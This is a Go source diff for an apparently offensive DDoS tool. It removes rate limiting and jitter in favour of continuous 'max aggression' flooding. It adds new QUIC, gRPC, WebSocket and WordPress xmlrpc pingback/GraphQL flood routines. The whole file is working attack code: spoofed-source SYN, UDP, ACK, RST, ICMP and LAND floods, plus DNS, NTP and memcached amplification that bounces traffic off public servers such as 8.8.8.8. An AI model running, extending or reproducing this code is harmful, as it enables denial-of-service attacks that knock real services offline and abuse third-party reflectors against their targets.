@@ -1,57 +1,28 @@
 package main
 
 import (
+	"fmt"
 	"math/rand"
+	"net"
+	"sync"
 	"sync/atomic"
 	"time"
-
-	"hackit/ddos/internal/ai_scheduler"
-	"hackit/ddos/internal/burst_controller"
-	"hackit/ddos/internal/protocol_switcher"
 )
 
 type Dispatcher struct {
 	cfg       *AttackConfig
 	status    chan<- WorkerStats
 	stop      int32
-	rateSched *ai_scheduler.AdaptiveRate
-	cpuMgr    *burst_controller.CPUManager
-	ifBond    *burst_controller.InterfaceBond
-	switchEng *protocol_switcher.SwitchEngine
 }
 
-func NewDispatcher(cfg *AttackConfig, status chan<- WorkerStats,
-	rateSched *ai_scheduler.AdaptiveRate,
-	cpuMgr *burst_controller.CPUManager,
-	ifBond *burst_controller.InterfaceBond,
-	switchEng *protocol_switcher.SwitchEngine) *Dispatcher {
-	return &Dispatcher{
-		cfg:       cfg,
-		status:    status,
-		rateSched: rateSched,
-		cpuMgr:    cpuMgr,
-		ifBond:    ifBond,
-		switchEng: switchEng,
-	}
+func NewDispatcher(cfg *AttackConfig, status chan<- WorkerStats) *Dispatcher {
+	return &Dispatcher{cfg: cfg, status: status}
 }
 
-func (d *Dispatcher) Stop() {
-	atomic.StoreInt32(&d.stop, 1)
-}
+func (d *Dispatcher) Stop()         { atomic.StoreInt32(&d.stop, 1) }
+func (d *Dispatcher) stopped() bool { return atomic.LoadInt32(&d.stop) != 0 }
 
-func (d *Dispatcher) stopped() bool {
-	return atomic.LoadInt32(&d.stop) != 0
-}
-
-func (d *Dispatcher) currentMethod() string {
-	if d.switchEng != nil {
-		m := d.switchEng.Current()
-		return d.switchEng.MethodName(m)
-	}
-	return d.cfg.Method
-}
-
-func (d *Dispatcher) Run(done chan<- struct{}) {
+func (d *Dispatcher) Run(done chan struct{}) {
 	method := d.cfg.Method
 
 	if method == "kill" || method == "all" || method == "land" || method == "slowloris" || method == "amp" || method == "mix" {
@@ -79,10 +50,31 @@ func (d *Dispatcher) Run(done chan<- struct{}) {
 		return
 	}
 
+	if method == "quic" {
+		d.runQUIC(done)
+		return
+	}
+
+	if method == "grpc" {
+		d.runGRPC(done)
+		return
+	}
+
+	if method == "ws" {
+		d.runWebSocket(done)
+		return
+	}
+
+	if method == "wp" {
+		d.runWordPress(done)
+		return
+	}
+
 	targetIP := d.cfg.Target
 	targetPort := d.cfg.Port
 	workers := d.cfg.Workers
-	rateLimit := d.cfg.RateLimit
+	if workers > 1024 { workers = 1024 }
+	if workers < 1 { workers = 1 }
 
 	spoofPool := d.cfg.SpoofPool
 	if len(spoofPool) == 0 {
@@ -91,7 +83,6 @@ func (d *Dispatcher) Run(done chan<- struct{}) {
 			spoofPool[i] = randIP()
 		}
 	}
-
 	spoofU32 := make([]uint32, len(spoofPool))
 	for i, s := range spoofPool {
 		spoofU32[i] = parseSpoof(s)
@@ -106,80 +97,53 @@ func (d *Dispatcher) Run(done chan<- struct{}) {
 	}
 	defer CloseEngine()
 
-	if d.cfg.XDPEnable {
-		iface := d.cfg.Interfaces
-		if len(iface) > 0 {
-			errf(`{"type":"xdp","message":"attaching XDP to %s"}`+"\n", iface[0])
-		}
-	}
-
-	work := make(chan workUnit, workers*10)
+	work := make(chan workUnit, 65536)
 	var active int32
 
 	for i := 0; i < workers; i++ {
-		w := i
-		go func() {
-			if d.cpuMgr != nil {
-				core, err := d.cpuMgr.AllocateCore()
-				if err == nil {
-					d.cpuMgr.PinToCore(core)
-					defer d.cpuMgr.ReleaseCore(core)
-				}
-			}
-			d.worker(work, targetIP, targetPort, spoofPool, &active)
-		}()
-		_ = w
+		go func() { d.worker(work, targetIP, targetPort, spoofPool, &active) }()
 	}
 
-	totalSeconds := d.cfg.Duration
+	deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
 
-	for batch := 0; batch < totalSeconds; batch++ {
-		if d.stopped() {
-			break
-		}
-
-		currentMethod := d.currentMethod()
-		currentRate := rateLimit
-		if d.rateSched != nil {
-			currentRate = d.rateSched.ComputeRate()
-		}
-
-		currentIface := ""
-		if d.ifBond != nil {
-			currentIface = d.ifBond.SelectInterface()
-			d.ifBond.MarkActive(currentIface)
-		}
-
-		ppw := currentRate / workers
-		if ppw < 1 {
-			ppw = 1
-		}
-
-		for w := 0; w < workers; w++ {
+	/* Continuous dispatch — no sleep, max aggression */
+	go func() {
+		methodIdx := 0
+		methods := []string{"syn", "udp", "ack", "rst", "icmp", "land"}
+		for time.Now().Before(deadline) && !d.stopped() {
+			m := d.cfg.Method
+			if m == "mix" || m == "all" {
+				m = methods[methodIdx%len(methods)]
+				methodIdx++
+			}
 			select {
-			case work <- workUnit{count: ppw, method: currentMethod, iface: currentIface}:
+			case work <- workUnit{count: 65535, method: m}:
 			default:
 			}
 		}
+		close(work)
+	}()
 
-		time.Sleep(1 * time.Second)
-
-		d.status <- WorkerStats{
-			Active:    int(atomic.LoadInt32(&active)),
-			Rate:      currentRate,
-			Method:    currentMethod,
-			Interface: currentIface,
+	/* Status ticker */
+	ticker := time.NewTicker(1 * time.Second)
+	defer ticker.Stop()
+	for !d.stopped() && time.Now().Before(deadline) {
+		select {
+		case <-ticker.C:
+			d.status <- WorkerStats{
+				Active: int(atomic.LoadInt32(&active)),
+				Method: d.cfg.Method,
+			}
+		case <-done:
+			return
 		}
 	}
-	close(work)
-	time.Sleep(200 * time.Millisecond)
 	done <- struct{}{}
 }
 
 type workUnit struct {
 	count  int
 	method string
-	iface  string
 }
 
 func (d *Dispatcher) worker(work <-chan workUnit, targetIP string, targetPort int, spoofPool []string, active *int32) {
@@ -191,113 +155,71 @@ func (d *Dispatcher) worker(work <-chan workUnit, targetIP string, targetPort in
 
 	for wu := range work {
 		atomic.AddInt32(active, 1)
-
-		var sent int64
-		var errs int64
-
 		spoof := spoofPool[rand.Intn(len(spoofPool))]
-
 		method := wu.method
-		if method == "" {
-			method = d.cfg.Method
-		}
+		if method == "" { method = d.cfg.Method }
 
 		for i := 0; i < wu.count; i++ {
-			if d.stopped() {
-				break
-			}
-
-			var err error
+			if d.stopped() { break }
 			switch method {
 			case "syn":
-				err = SendSYN(targetIP, targetPort, spoof)
+				SendSYN(targetIP, targetPort, spoof)
 			case "udp":
-				err = SendUDP(targetIP, targetPort, spoof, 1024)
+				SendUDP(targetIP, targetPort, spoof, 65000)
 			case "ack":
-				err = SendACK(targetIP, targetPort, spoof)
+				SendACK(targetIP, targetPort, spoof)
 			case "rst":
-				err = SendRST(targetIP, targetPort, spoof)
+				SendRST(targetIP, targetPort, spoof)
 			case "icmp":
-				err = SendICMP(targetIP, spoof)
+				SendICMP(targetIP, spoof)
 			case "dns":
-				err = SendDNSAmp(targetIP, spoof, "8.8.8.8")
+				SendDNSAmp(targetIP, spoof, "8.8.8.8")
 			case "ntp":
-				err = SendNTPAmp(targetIP, spoof, "pool.ntp.org")
+				SendNTPAmp(targetIP, spoof, "pool.ntp.org")
 			case "land":
-				err = SendLAND(targetIP, targetPort)
+				SendLAND(targetIP, targetPort)
 			case "amp":
-				err = SendDNSAmp(targetIP, spoof, "8.8.8.8")
+				SendDNSAmp(targetIP, spoof, "8.8.8.8")
 				SendNTPAmp(targetIP, spoof, "pool.ntp.org")
 				MemcachedAmp(targetIP, spoof, "1.2.3.4")
 			case "bypass":
-				err = StatefulBypassFlood(targetIP, targetPort, spoof)
+				StatefulBypassFlood(targetIP, targetPort, spoof)
 			default:
-				err = SendUDP(targetIP, targetPort, spoof, 1024)
-			}
-
-			if err != nil {
-				errs++
-				if d.switchEng != nil && d.switchEng.ShouldSwitch() {
-					newMethod := d.switchEng.NextMethod()
-					method = d.switchEng.MethodName(newMethod)
-					errf(`{"type":"switch","from":"%s","to":"%s"}`+"\n",
-						d.cfg.Method, method)
-				}
-			} else {
-				sent++
-				if d.switchEng != nil {
-					d.switchEng.RecordBlock()
-				}
-			}
-
-			if d.cfg.Jitter > 0 {
-				time.Sleep(time.Duration(rand.Intn(d.cfg.Jitter)) * time.Microsecond)
+				SendUDP(targetIP, targetPort, spoof, 65000)
 			}
 		}
-
-		d.status <- WorkerStats{
-			Sent:   sent,
-			Errors: errs,
-			Method: method,
-		}
+		d.status <- WorkerStats{Sent: int64(wu.count), Method: method}
 		atomic.AddInt32(active, -1)
 	}
 }
 
-func (d *Dispatcher) runHTTP(done chan<- struct{}) {
+func (d *Dispatcher) runHTTP(done chan struct{}) {
 	flooder := NewHTTPFlooder()
 	proxyList := d.cfg.ProxyList
 	if len(proxyList) == 0 && d.cfg.TorProxy != "" {
 		proxyList = []string{d.cfg.TorProxy}
 	}
-	go flooder.Run(d.cfg.Target, d.cfg.Port, d.cfg.Workers,
-		d.cfg.RateLimit, d.cfg.Duration, proxyList, d.cfg.Jitter, d.status)
+	workers := d.cfg.Workers
+	if workers < 1 { workers = 256 }
+	go flooder.Run(d.cfg.Target, d.cfg.Port, workers,
+		999999999, d.cfg.Duration, proxyList, 0, d.status)
 
 	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
-
-	totalSeconds := d.cfg.Duration
-	for batch := 0; batch < totalSeconds; batch++ {
-		if d.stopped() {
-			flooder.Stop()
-			break
-		}
+	deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
+	for !d.stopped() && time.Now().Before(deadline) {
 		<-ticker.C
 	}
+	flooder.Stop()
 	done <- struct{}{}
 }
 
-func (d *Dispatcher) runH2RapidReset(done chan<- struct{}) {
+func (d *Dispatcher) runH2RapidReset(done chan struct{}) {
 	defer func() {
 		if r := recover(); r != nil {
 			errf(`{"type":"recover","message":"H2 rapid reset panic: %v"}`+"\n", r)
 		}
 	}()
-
-	streams := d.cfg.H2ConcurrentStreams
-	if streams < 1 {
-		streams = 100
-	}
 
 	spoofPool := d.cfg.SpoofPool
 	if len(spoofPool) == 0 {
@@ -314,24 +236,152 @@ func (d *Dispatcher) runH2RapidReset(done chan<- struct{}) {
 
 	err := InitEngine()
 	if err == nil {
-		for i := 0; i < d.cfg.Duration; i++ {
-			if d.stopped() {
-				break
-			}
-			spoof := d.cfg.SpoofIP
-			if spoof == "" && len(d.cfg.SpoofPool) > 0 {
-				spoof = d.cfg.SpoofPool[rand.Intn(len(d.cfg.SpoofPool))]
-			}
-			for s := 0; s < streams; s++ {
-				SendSYN(d.cfg.Target, d.cfg.Port, spoof)
-			}
-			time.Sleep(1 * time.Second)
-			d.status <- WorkerStats{
-				Active: streams,
-				Method: "h2",
-			}
+		workers := d.cfg.Workers
+		if workers < 1 { workers = 256 }
+		deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
+		var wg sync.WaitGroup
+		for w := 0; w < workers; w++ {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				spoof := spoofPool[rand.Intn(len(spoofPool))]
+				for time.Now().Before(deadline) && !d.stopped() {
+					SendSYN(d.cfg.Target, d.cfg.Port, spoof)
+				}
+			}()
 		}
+		wg.Wait()
 		CloseEngine()
 	}
+	done <- struct{}{}
+}
+
+func (d *Dispatcher) runQUIC(done chan struct{}) {
+	defer func() {
+		if r := recover(); r != nil {
+			errf(`{"type":"recover","message":"QUIC flood panic: %v"}`+"\n", r)
+		}
+	}()
+	deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
+	addr := fmt.Sprintf("%s:%d", d.cfg.Target, d.cfg.Port)
+	raddr, err := net.ResolveUDPAddr("udp", addr)
+	if err != nil { done <- struct{}{}; return }
+	workers := d.cfg.Workers
+	if workers < 1 { workers = 256 }
+	var wg sync.WaitGroup
+	for w := 0; w < workers && w < 256; w++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			conn, err := net.DialUDP("udp", nil, raddr)
+			if err != nil { return }
+			defer conn.Close()
+			for time.Now().Before(deadline) && !d.stopped() {
+				pkt := buildQUICInitial()
+				conn.Write(pkt)
+			}
+		}()
+	}
+	wg.Wait()
+	done <- struct{}{}
+}
+
+func (d *Dispatcher) runGRPC(done chan struct{}) {
+	defer func() {
+		if r := recover(); r != nil {
+			errf(`{"type":"recover","message":"gRPC flood panic: %v"}`+"\n", r)
+		}
+	}()
+	deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
+	addr := fmt.Sprintf("%s:%d", d.cfg.Target, d.cfg.Port)
+	workers := d.cfg.Workers
+	if workers < 1 { workers = 256 }
+	var wg sync.WaitGroup
+	for w := 0; w < workers && w < 256; w++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for time.Now().Before(deadline) && !d.stopped() {
+				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+				if err != nil { continue }
+				conn.Write(buildGRPCUnaryFrame())
+				conn.Close()
+			}
+		}()
+	}
+	wg.Wait()
+	done <- struct{}{}
+}
+
+func (d *Dispatcher) runWebSocket(done chan struct{}) {
+	defer func() {
+		if r := recover(); r != nil {
+			errf(`{"type":"recover","message":"WebSocket flood panic: %v"}`+"\n", r)
+		}
+	}()
+	deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
+	addr := fmt.Sprintf("%s:%d", d.cfg.Target, d.cfg.Port)
+	workers := d.cfg.Workers
+	if workers < 1 { workers = 256 }
+	var wg sync.WaitGroup
+	for w := 0; w < workers && w < 256; w++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for time.Now().Before(deadline) && !d.stopped() {
+				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+				if err != nil { continue }
+				key := randStr(16)
+				upgrade := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s==\r\nSec-WebSocket-Version: 13\r\n\r\n", addr, key)
+				conn.Write([]byte(upgrade))
+				maskKey := []byte{byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256))}
+				payload := make([]byte, 64)
+				for j := range payload { payload[j] = byte(rand.Intn(256)) }
+				for i := 0; i < 100; i++ {
+					if time.Now().After(deadline) || d.stopped() { break }
+					frame := buildWSPing(maskKey, payload)
+					if _, err := conn.Write(frame); err != nil { break }
+				}
+				conn.Close()
+			}
+		}()
+	}
+	wg.Wait()
+	done <- struct{}{}
+}
+
+func (d *Dispatcher) runWordPress(done chan struct{}) {
+	defer func() {
+		if r := recover(); r != nil {
+			errf(`{"type":"recover","message":"WordPress flood panic: %v"}`+"\n", r)
+		}
+	}()
+	deadline := time.Now().Add(time.Duration(d.cfg.Duration) * time.Second)
+	addr := fmt.Sprintf("%s:%d", d.cfg.Target, d.cfg.Port)
+	workers := d.cfg.Workers
+	if workers < 1 { workers = 256 }
+	xmlPayload := `<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://example.com/</string></value></param><param><value><string>http://` + d.cfg.Target + `/</string></value></param></params></methodCall>`
+	graphqlPayload := `{"query":"query { __schema { types { name fields { name } } } }"}`
+	var wg sync.WaitGroup
+	for w := 0; w < workers && w < 256; w++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for time.Now().Before(deadline) && !d.stopped() {
+				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+				if err != nil { continue }
+				xmlReq := fmt.Sprintf("POST /xmlrpc.php HTTP/1.1\r\nHost: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n%s", d.cfg.Target, len(xmlPayload), xmlPayload)
+				conn.Write([]byte(xmlReq))
+				conn.Close()
+
+				conn2, err := net.DialTimeout("tcp", addr, 5*time.Second)
+				if err != nil { continue }
+				gqlReq := fmt.Sprintf("POST /graphql HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s", d.cfg.Target, len(graphqlPayload), graphqlPayload)
+				conn2.Write([]byte(gqlReq))
+				conn2.Close()
+			}
+		}()
+	}
+	wg.Wait()
 	done <- struct{}{}
 }
